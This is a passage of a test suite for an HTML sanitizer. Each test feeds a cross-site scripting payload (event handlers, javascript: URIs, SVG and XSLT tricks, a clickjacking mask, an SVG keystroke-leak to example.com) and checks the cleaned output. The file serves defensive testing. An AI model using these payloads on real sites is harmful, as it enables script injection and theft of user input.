      "<div id=\"95\"><svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<feImage>\n\n</feImage>\n</svg>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"95\"><svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" >\n\n<feImage>\n\n</feImage>\n\n</svg>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"95\"><svg xmlns=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<feImage>\n\n</feImage>\n</svg>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"96\"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>\n<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"96\">\n//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"97\"><!-- IE 5-9 -->\n<div id=d><x xmlns=\"><iframe onload=alert(97)\"></div>\n<script>d.innerHTML+='';</script>\n<!-- IE 10 in IE5-9 Standards mode -->\n<div id=d><x xmlns='\"><iframe onload=alert(2)//'></div>\n<script>d.innerHTML+='';</script>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"97\">\n<div id=\"d\"></div>\n\n\n<div id=\"d\"></div>\n//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"98\"><div id=d><div style=\"font-family:'sans\u{17}\u{02}F\u{02}A\u{12}\u{02}A\u{02}F\u{03}B color\u{03}Ared\u{03}B'\">X</div></div>\n<script>with(document.getElementById(\"d\"))innerHTML=innerHTML</script>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"98\"><div id=\"d\"><div style=\"font-family:'sans\u{17}\u{02}F\u{02}A\u{12}\u{02}A\u{02}F\u{03}B color\u{03}Ared\u{03}B'\">X</div></div>\n//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"98\"><div id=\"d\"><div style='font-family: \"sans&#23;&#2;F&#2;A&#18;&#2;A&#2;F&#3;B color&#3;Ared&#3;B\";'>X</div></div>\n//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"98\"><div id=\"d\"><div style=\"font-family:'sans&#23;&#2;F&#2;A&#18;&#2;A&#2;F&#3;B color&#3;Ared&#3;B'\">X</div></div>\n//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"99\">XXX<style>\n\n*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */\n\n<!--\n--><!--*{color:red}   /* all UA */\n\n*{background:url(xx //**/\red/*)} /* IE 6-7 Standards mode */\n\n</style>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"99\">XXX<style>\n\n*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */\n\n<!--\n--><!--*{color:red}   /* all UA */\n\n*{background:url(xx //**/\ned/*)} /* IE 6-7 Standards mode */\n\n</style>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"99\">XXX//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"102\"><img src=\"x` `<script>alert(102)</script>\"` `>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"102\"><img src=\"x` `&lt;script&gt;alert(102)&lt;/script&gt;\">//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"102\"><img src=\"x` `<script>alert(102)</script>\">//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"102\"><img src=\"x%60%20%60%3Cscript%3Ealert%28102%29%3C/script%3E\">//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"102\">//[\"'`--&gt;]]&gt;]</div>", "<div id=\"102\"><img>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"103\"><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//[\"'`-->]]>]</div><div id=\"104\"><svg xmlns=\"http://www.w3.org/2000/svg\" id=\"foo\">\n<x xmlns=\"http://www.w3.org/2001/xml-events\" event=\"load\" observer=\"foo\" handler=\"data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar\"/>\n</svg>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"103\">//[\"'`--&gt;]]&gt;]</div><div id=\"104\"><svg id=\"foo\" xmlns=\"http://www.w3.org/2000/svg\">\n\n</svg>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"103\">//[\"'`--&gt;]]&gt;]</div><div id=\"104\"><svg xmlns=\"http://www.w3.org/2000/svg\" id=\"foo\" xmlns=\"http://www.w3.org/2000/svg\">\n\n</svg>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"103\">//[\"'`--&gt;]]&gt;]</div><div id=\"104\"><svg xmlns=\"http://www.w3.org/2000/svg\" id=\"foo\">\n\n</svg>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"103\">//[\"'`--&gt;]]&gt;]</div><div id=\"104\">//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"105\"><iframe src=\"data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03\"></iframe>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"105\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"106\"><img src onerror /\" '\"= alt=alert(106)//\">//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"106\"><img src=\"\">//[\"'`--&gt;]]&gt;]</div>", "<div id=\"106\"><img>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"107\"><title onpropertychange=alert(107)></title><title title=></title>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"107\"><title></title><title title=\"\"></title>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"107\">//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"108\"><!-- IE 5-8 standards mode -->\n<a href=http://foo.bar/#x=`y></a><img alt=\"`><img src=xx onerror=alert(108)></a>\">\n<!-- IE 5-9 standards mode -->\n<!a foo=x=`y><img alt=\"`><img src=xx onerror=alert(2)//\">\n<?a foo=x=`y><img alt=\"`><img src=xx onerror=alert(3)//\">//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"108\">\n<a href=\"http://foo.bar/#x=`y\"></a><img alt=\"`&gt;&lt;img src=xx onerror=alert(108)&gt;&lt;/a&gt;\">\n\n<img alt=\"`&gt;&lt;img src=xx onerror=alert(2)//\">\n<img alt=\"`&gt;&lt;img src=xx onerror=alert(3)//\">//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"108\">\n<a href=\"http://foo.bar/#x=`y\"></a><img alt=\"`><img src=xx onerror=alert(108)></a>\">\n\n<img alt=\"`><img src=xx onerror=alert(2)//\">\n<img alt=\"`><img src=xx onerror=alert(3)//\">//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"108\">\n<a href=\"http://foo.bar/#x=%60y\"></a><img alt=\"`&gt;&lt;img src=xx onerror=alert(108)&gt;&lt;/a&gt;\">\n\n<img alt=\"`&gt;&lt;img src=xx onerror=alert(2)//\">\n<img alt=\"`&gt;&lt;img src=xx onerror=alert(3)//\">//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"108\">\n<a href=\"http://foo.bar/#x=`y\"></a>\n\n<img alt=\"`><img src=xx onerror=alert(2)//\">\n<img alt=\"`><img src=xx onerror=alert(3)//\">//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"108\">\n<a href=\"http://foo.bar/#x=`y\"></a>\n\n<img alt=\"`&gt;&lt;img src=xx onerror=alert(2)//\">\n<img alt=\"`&gt;&lt;img src=xx onerror=alert(3)//\">//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"109\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<a id=\"x\"><rect fill=\"white\" width=\"1000\" height=\"1000\"/></a>\n<rect  fill=\"white\" style=\"clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);\"/>\n</svg>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"109\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<a id=\"x\"><rect fill=\"white\" width=\"1000\" height=\"1000\"></rect></a>\n<rect fill=\"white\" style=\"clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);\"></rect>\n</svg>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"109\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<a id=\"x\"><rect fill=\"white\" width=\"1000\" height=\"1000\" /></a>\n<rect style=\"clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);\" fill=\"white\" />\n</svg>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"109\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<a id=\"x\"><rect fill=\"white\" width=\"1000\" height=\"1000\" FILL=\"white\" /></a>\n<rect style=\"clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);\" fill=\"white\" FILL=\"white\" />\n</svg>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"109\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<a id=\"x\"><rect fill=\"white\" width=\"1000\" height=\"1000\" /></a>\n<rect style=\"filter: url(&quot;#c&quot;); clip-path: url(&quot;test3.svg#a&quot;); fill: url(#b); marker-end: url(&quot;#d&quot;); marker-mid: url(&quot;#d&quot;); marker-start: url(&quot;#d&quot;); mask: url(&quot;#e&quot;); stroke: url(#f);\" fill=\"white\" />\n</svg>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"109\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<a id=\"x\"><rect fill=\"white\" width=\"1000\" height=\"1000\" /></a>\n<rect style=\"clip-path: url(&quot;test3.svg#a&quot;); fill: url(#b); marker-end: url(&quot;#d&quot;); marker-mid: url(&quot;#d&quot;); marker-start: url(&quot;#d&quot;); mask: url(&quot;#e&quot;); stroke: url(#f);\" fill=\"white\" />\n</svg>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"110\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M0,0\" style=\"marker-start:url(test4.svg#a)\"/>\n</svg>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"110\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M0,0\" style=\"marker-start:url(test4.svg#a)\"></path>\n</svg>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"110\"><svg xmlns=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M 0 0\" style=\"marker-start: url(&quot;test4.svg#a&quot;);\" />\n</svg>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"110\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M 0 0\" style=\"marker-start:url(test4.svg#a)\" />\n</svg>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"110\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M 0 0\" style=\"marker-start: url(&quot;test4.svg#a&quot;);\" />\n</svg>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"111\"><div style=\"background:url(/f#[a]oo/;color:red/*/foo.jpg);\">X</div>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"111\"><div style=\"background:url(/f#[a]oo/;color:red/*/foo.jpg);\">X</div>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"111\"><div style='background: url(\"/f#[a]oo/;color:red/*/foo.jpg\");'>X</div>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"112\"><div style=\"font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);\">X</div>//[\"'`-->]]>]</div><div id=\"113\"><div id=\"x\">XXX</div>\n<style>\n\n#x{font-family:foo[bar;color:green;}\n\n#y];color:red;{}\n\n</style>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"112\"><div style=\"font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);\">X</div>//[\"'`--&gt;]]&gt;]</div><div id=\"113\"><div id=\"x\">XXX</div>\n<style>\n\n#x{font-family:foo[bar;color:green;}\n\n#y];color:red;{}\n\n</style>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"112\"><div>X</div>//[\"'`--&gt;]]&gt;]</div><div id=\"113\"><div id=\"x\">XXX</div>\n<style>\n\n#x{font-family:foo[bar;color:green;}\n\n#y];color:red;{}\n\n</style>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"114\"><x style=\"background:url('x[a];color:red;/*')\">XXX</x>//[\"'`-->]]>]</div><div id=\"115\"><!--[if]><script>alert(115)</script -->\n<!--[if<img src=x onerror=alert(2)//]> -->//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"114\">XXX//[\"'`--&gt;]]&gt;]</div><div id=\"115\">\n//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "XML" {
  let payload = "<div id=\"116\"><div id=\"x\">x</div>\n<xml:namespace prefix=\"t\">\n<import namespace=\"t\" implementation=\"#default#time2\">\n<t:set attributeName=\"innerHTML\" targetElement=\"x\" to=\"<img\u{0b}src=x\u{0b}onerror\u{0b}=alert(116)>\">//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"116\"><div id=\"x\">x</div>\n\n\n//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "iframe" {
  let payload = "<div id=\"117\"><a href=\"http://attacker.org\">\n    <iframe src=\"http://example.org/\"></iframe>\n</a>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"117\"><a href=\"http://attacker.org\">\n    \n</a>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Drag & drop" {
  let payload = "<div id=\"118\"><div draggable=\"true\" ondragstart=\"event.dataTransfer.setData('text/plain','malicious code');\">\n    <h1>Drop me</h1>\n</div>\n<iframe src=\"http://www.example.org/dropHere.html\"></iframe>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"118\"><div draggable=\"true\">\n    <h1>Drop me</h1>\n</div>\n//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "view-source" {
  let payload = "<div id=\"119\"><iframe src=\"view-source:http://www.example.org/\" frameborder=\"0\" style=\"width:400px;height:180px\"></iframe>"
  assert_true(
    ["<div id=\"119\"></div>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<textarea type=\"text\" cols=\"50\" rows=\"10\"></textarea>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<textarea type=\"text\" cols=\"50\" rows=\"10\"></textarea>//[\"'`--&gt;]]&gt;]",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "window.open" {
  let payload = "<div id=\"120\"><script>\nfunction makePopups(){\n    for (i=1;i<6;i++) {\n        window.open('popup.html','spam'+i,'width=50,height=50');\n    }\n}\n</script>\n<body>\n<a href=\"#\" onclick=\"makePopups()\">Spam</a>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"120\">\n\n<a href=\"#\">Spam</a>//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"121\"><html xmlns=\"http://www.w3.org/1999/xhtml\"\nxmlns:svg=\"http://www.w3.org/2000/svg\">\n<body style=\"background:gray\">\n<iframe src=\"http://example.com/\" style=\"width:800px; height:350px; border:none; mask: url(#maskForClickjacking);\"/>\n<svg:svg>\n<svg:mask id=\"maskForClickjacking\" maskUnits=\"objectBoundingBox\" maskContentUnits=\"objectBoundingBox\">\n    <svg:rect x=\"0.0\" y=\"0.0\" width=\"0.373\" height=\"0.3\" fill=\"white\"/>\n    <svg:circle cx=\"0.45\" cy=\"0.7\" r=\"0.075\" fill=\"white\"/>\n</svg:mask>\n</svg:svg>\n</body>\n</html>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"121\">\n\n\n\n\n    \n    \n\n\n\n//[\"'`--&gt;]]&gt;]</div>", "<div id=\"121\">\n\n\n&lt;svg:svg&gt;\n&lt;svg:mask id=\"maskForClickjacking\" maskUnits=\"objectBoundingBox\" maskContentUnits=\"objectBoundingBox\"&gt;\n    &lt;svg:rect x=\"0.0\" y=\"0.0\" width=\"0.373\" height=\"0.3\" fill=\"white\"/&gt;\n    &lt;svg:circle cx=\"0.45\" cy=\"0.7\" r=\"0.075\" fill=\"white\"/&gt;\n&lt;/svg:mask&gt;\n&lt;/svg:svg&gt;\n&lt;/body&gt;\n&lt;/html&gt;//[\"'`--&gt;]]&gt;]&lt;/div&gt;</div>",
      "<div id=\"121\">\n\n</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "iframe (sandboxed)" {
  let payload = "<div id=\"122\"><iframe sandbox=\"allow-same-origin allow-forms allow-scripts\" src=\"http://example.org/\"></iframe>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"122\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"123\"><span class=foo>Some text</span>\n<a class=bar href=\"http://www.example.org\">www.example.org</a>\n<script src=\"http://code.jquery.com/jquery-1.4.4.js\"></script>\n<script>\n$(\"span.foo\").click(function() {\nalert('foo');\n$(\"a.bar\").click();\n});\n$(\"a.bar\").click(function() {\nalert('bar');\nlocation=\"http://html5sec.org\";\n});\n</script>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"123\"><span class=\"foo\">Some text</span>\n<a href=\"http://www.example.org\" class=\"bar\">www.example.org</a>\n\n//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"123\"><span class=\"foo\">Some text</span>\n<a class=\"bar\" href=\"http://www.example.org\">www.example.org</a>\n\n//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"124\"><script src=\"/example.com\u{0c}oo.js\"></script> // Safari 5.0, Chrome 9, 10\n<script src=\"\\example.com\u{0c}oo.js\"></script> // Safari 5.0//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"124\"> // Safari 5.0, Chrome 9, 10\n // Safari 5.0//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"125\"><?xml version=\"1.0\"?><?xml-stylesheet type=\"text/xml\" href=\"#stylesheet\"?><!DOCTYPE doc [<!ATTLIST xsl:stylesheet  id    ID    #REQUIRED>]><svg xmlns=\"http://www.w3.org/2000/svg\">    <xsl:stylesheet id=\"stylesheet\" version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">        <xsl:template match=\"/\">            <iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:alert(125)\"></iframe>        </xsl:template>    </xsl:stylesheet>    <circle fill=\"red\" r=\"40\"></circle></svg>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"125\">]&gt;<svg xmlns=\"http://www.w3.org/2000/svg\">        <circle fill=\"red\" r=\"40\"></circle></svg>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"125\">]&gt;<svg xmlns=\"http://www.w3.org/2000/svg\">                                        <circle fill=\"red\" r=\"40\"></circle></svg>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"125\">]&gt;<svg xmlns=\"http://www.w3.org/2000/svg\">        <circle fill=\"red\" r=\"40\" /></svg>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"125\">]&gt;<svg xmlns=\"http://www.w3.org/2000/svg\">                                        <circle fill=\"red\" r=\"40\" /></svg>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"125\">]&gt;//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"126\"><object id=\"x\" classid=\"clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598\"></object>\n<object classid=\"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B\" onqt_error=\"alert(126)\" style=\"behavior:url(#x);\"><param name=postdomevents /></object>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"126\">\n//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"127\"><svg xmlns=\"http://www.w3.org/2000/svg\" id=\"x\">\n<listener event=\"load\" handler=\"#y\" xmlns=\"http://www.w3.org/2001/xml-events\" observer=\"x\"/>\n<handler id=\"y\">alert(127)</handler>\n</svg>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"127\"><svg xmlns=\"http://www.w3.org/2000/svg\" id=\"x\">\n\nalert(127)\n</svg>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"127\"><svg xmlns=\"http://www.w3.org/2000/svg\" id=\"x\">\n\n\n</svg>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"128\"><svg><style><img/src=x onerror=alert(128)// </b>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"128\"><svg><style></style></svg><img src=\"x\">//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"128\"><svg><style><img src=\"x\">//[\"'`--&gt;]]&gt;]</img></style></svg></div>",
      "<div id=\"128\"><svg><style><img src=\"x\"></style></svg></div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Inline SVG (data-uri)" {
  let payload = "<div id=\"129\"><svg><image style='filter:url(\"data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>\")'>\n<!--\nSame effect with\n<image filter='...'>\n-->\n</svg>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"129\"><svg><image style=\"filter:url(&quot;data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22&gt;&lt;script&gt;parent.alert(129)&lt;/script&gt;&lt;/svg&gt;&quot;)\">\n\n</image></svg>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"129\"><svg><image style=\"filter:url(&quot;data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>&quot;)\">\n\n</image></svg>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"129\"><svg><image>\n\n</image></svg>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "MathML" {
  let payload = "<div id=\"130\"><math href=\"javascript:alert(130)\">CLICKME</math>\n<math>\n<!-- up to FF 13 -->\n<maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:alert(2)\">CLICKME</maction>\n\n<!-- FF 14+ -->\n<maction actiontype=\"statusline\" xlink:href=\"javascript:alert(3)\">CLICKME<mtext>http://http://google.com</mtext></maction>\n</math>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"130\"><math>CLICKME</math>\n<math>\n\n\n\n\n\n</math>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"130\"><math>CLICKME</math>\n<math>\n\nCLICKME\n\n\nCLICKME<mtext>http://http://google.com</mtext>\n</math>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"130\"><math>CLICKME</math>\n//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"132\"><!doctype html>\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input name=\"secret\" type=\"password\">\n</form>\n<!-- injection --><svg height=\"50px\">\n<image xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<set attributeName=\"xlink:href\" begin=\"accessKey(a)\" to=\"//example.com/?a\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(b)\" to=\"//example.com/?b\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(c)\" to=\"//example.com/?c\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(d)\" to=\"//example.com/?d\" />\n</image>\n</svg>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"132\">\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input type=\"password\" name=\"secret\">\n</form>\n<svg height=\"50px\">\n<image xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n\n\n\n\n</image>\n</svg>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"132\">\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input name=\"secret\" type=\"password\">\n</form>\n<svg height=\"50px\">\n<image xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n\n\n\n\n</image>\n</svg>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"133\"><!-- `<img/src=xxx onerror=alert(133)//--!>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"133\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "XMP" {
  let payload = "<div id=\"134\"><xmp>\n<%\n</xmp>\n<img alt='%></xmp><img src=xx onerror=alert(134)//'>\n\n<script>\nx='<%'\n</script> %>/\nalert(2)\n</script>\n\nXXX\n<style>\n*['<!--']{}\n</style>\n-->{}\n*{color:red}</style>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"134\">\n<img alt=\"%></xmp><img src=xx onerror=alert(134)//\">\n\n %&gt;/\nalert(2)\n\n\nXXX\n<style>\n*['<!--']{}\n</style>\n--&gt;{}\n*{color:red}//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"134\">\n<img alt=\"%&gt;&lt;/xmp&gt;&lt;img src=xx onerror=alert(134)//\">\n\n %&gt;/\nalert(2)\n\n\nXXX\n<style>\n*['<!--']{}\n</style>\n-&gt;{}\n*{color:red}//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"134\">\n<img alt=\"%></xmp><img src=xx onerror=alert(134)//\">\n\n %&gt;/\nalert(2)\n\n\nXXX\n\n--&gt;{}\n*{color:red}//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"134\">\n<img alt=\"%&gt;&lt;/xmp&gt;&lt;img src=xx onerror=alert(134)//\">\n\n %&gt;/\nalert(2)\n\n\nXXX\n\n--&gt;{}\n*{color:red}//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"134\">\n<img>\n\n %&gt;/\nalert(2)\n\n\nXXX\n\n--&gt;{}\n*{color:red}//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "SVG" {
  let payload = "<div id=\"135\"><?xml-stylesheet type=\"text/xsl\" href=\"#\" ?>\n<stylesheet xmlns=\"http://www.w3.org/TR/WD-xsl\">\n<template match=\"/\">\n<eval>new ActiveXObject('htmlfile').parentWindow.alert(135)</eval>\n<if expr=\"new ActiveXObject('htmlfile').parentWindow.alert(2)\"></if>\n</template>\n</stylesheet>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"135\">\n\n<template>\n\n\n</template>\n//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"135\">\n\n<template>\nnew ActiveXObject('htmlfile').parentWindow.alert(135)\n\n</template>\n//[\"'`--&gt;]]&gt;]</div>",
